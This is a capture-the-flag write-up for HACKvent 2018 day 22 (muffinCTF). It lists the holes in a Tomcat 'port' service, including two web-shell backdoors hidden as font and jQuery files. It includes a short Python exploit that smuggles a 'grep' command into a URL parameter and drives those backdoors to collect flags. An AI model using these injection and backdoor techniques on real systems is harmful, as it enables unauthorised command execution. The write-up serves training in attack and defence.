# Day 22: MuffinCTF

*Day 2*

```
DAY 2 Services
--------------------------------------------

             ,-_                  (`  ).
             |-_'-,              (     ).
             |-_'-'           _(        '`.
     _        |-_'/        .=(`(      .     )
     /;-,_     |-_'        (     (.__.:-`-_.'
     /-.-;,-,___|'          `(       ) )
     /;-;-;-;_;_/|\_ _ _ _ _   ` __.:'   )
     x_( __`|_P_|`-;-;-;,|        `--'
     |\ \    _||   `-;-;-'
     | \`   -_|.      '-'
     | /   /-_| `
     |/   ,'-_|  \
     /____|'-_|___\
     _..,____]__|_\-_'|_[___,.._
     '                          ``'--,..,.

    Name: mill
    Description:
        The wheels are moving all day here.
        The best flour in the whole city is produced in this mill.
        Improve the security of the mill.
        And reduce production rate of food for enemy nations.
    Creator: xorkiwi

                        __--___
                      >_'--'__'
                     _________!__________
                    /   /   /   /   /   /
                   /   /   /   /   /   /
                  |   |   |   |   |   |
             __^  |   |   |   |   |   |
           _/@  \  \   \   \   \   \   \
          S__   |   \   \   \   \   \   \         __
         (   |  |    \___\___\___\___\___\       /  \
             |   \             |                |  |\|
             \    \____________!________________/  /
              \ _______OOOOOOOOOOOOOOOOOOO________/
               \________\\\\\\\\\\\\\\\\\\_______/
     %%%^^^^^%%%%%^^^^!!^%%^^^^%%%%%!!!!^^^^^^!%^^^%%%%!!^^
     ^^!!!!%%%%^^^^!!^^%%%%%^^!!!^^%%%%%!!!%%%%^^^!!^^%%%!!

    Name: port
    Description:
        There are ships coming from a long distance.
        At the top of the light house you can have a nice view at the sea.
        Attention, make sure that there are no enemy ships coming into our port.
        Maybe you want to send some ships of us to remind them of our offensive capabilities.
    Creator: xorkiwi
```

Login to: [muffinCTF](http://whale.hacking-lab.com:9280/)

### Description

To get the HACKvent day 22 (muffinCTF day 2), you had to achieve the following requirements, in at least 2 of the last 5 ticks (1 tick = 3 minutes).

Have [mill](files/mill.zip) or/and [port](files/port.zip) service running with the following stats:
 - attack points > 20
 - maximal defense points
 - maximal availability points
 
Here is a copy of the [official instructions](INSTRUCTIONS.md).

### Solution

I completely skipped the mill service and focused solely on the port written in Java. Here is what I found.

##### Port

- Arbitrary command execution in `/opt/tomcat/apache-tomcat-9.0.8/webapps/ROOT/searchPortname.jsp`
- Arbitrary JSP page upload in `/opt/tomcat/apache-tomcat-9.0.8/webapps/ROOT/WEB-INF/classes/com/servlet/FileUploadServlet.class`
- Sneaky remote shell backdoor hidden in `/opt/tomcat/apache-tomcat-9.0.8/webapps/ROOT/css/themes/default/assets/fonts/icons.svg.jsp`
- Another sneaky remote shell hidden in `/opt/tomcat/apache-tomcat-9.0.8/webapps/ROOT/js/Framework/jquery.min/javascript/plugins/lib/jquery.min.js.jsp`

I patched my service, removed subdirectory `default` and started it.

Then I picked few of those vulnerabilities I found and wrote this exploit which earned me the flag.

```python
def port_exploit(attack_url):
    output = ''

    # grep -hra muffinCTF /opt/tomcat/tomcat-latest/webapps/ROOT/uploads
    output += get_flags(attack_url + 'searchPortname.jsp?port=google.com%3Bgrep+-hra+muffinCTF+/opt/tomcat/tomcat-latest/webapps/ROOT/uploads')
    output += get_flags(attack_url + 'css/themes/default/assets/fonts/icons.svg.jsp?cmd=grep+-hra+muffinCTF+/opt/tomcat/tomcat-latest/webapps/ROOT/uploads')
    output += get_flags(attack_url + 'js/Framework/jquery.min/javascript/plugins/lib/jquery.min.js.jsp?cmd=grep+-hra+muffinCTF+/opt/tomcat/tomcat-latest/webapps/ROOT/uploads')

    return output

muffin_ctf.attack_all('port', port_exploit)
```

Complete source code of my exploit can be found [here](../../src/main/python/hackvent2018/Day22.py).

This is the flag I got.

```
HV18{muffinCTF{d4y_2_g0sh_y0ur_r34lly_pwn1n_th3_stuff_l3l_g00d_b0y_g0_4h34d}}
```
